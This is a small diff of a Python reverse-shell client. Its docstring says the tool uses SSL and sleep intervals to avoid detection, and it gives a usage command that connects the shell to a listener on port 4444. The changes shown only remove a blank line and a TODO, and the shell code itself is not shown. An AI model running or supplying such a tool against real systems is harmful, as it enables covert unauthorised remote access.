@@ -7,7 +7,6 @@ import ssl
 import sys
 
 
-
 """
 Reverse shell in python 3. Has SSL functionality and periods of sleep to avoid detection.
 To close the shell properly, send "exit" from the server.
@@ -15,7 +14,6 @@ USAGE: python client.py --ssl 127.0.0.1 4444
 """
 
 #TODO Add "get" and "put" functionality
-#TODO add https mode
 
 def parse_args():
     """Define host and port variables with optional ssl"""
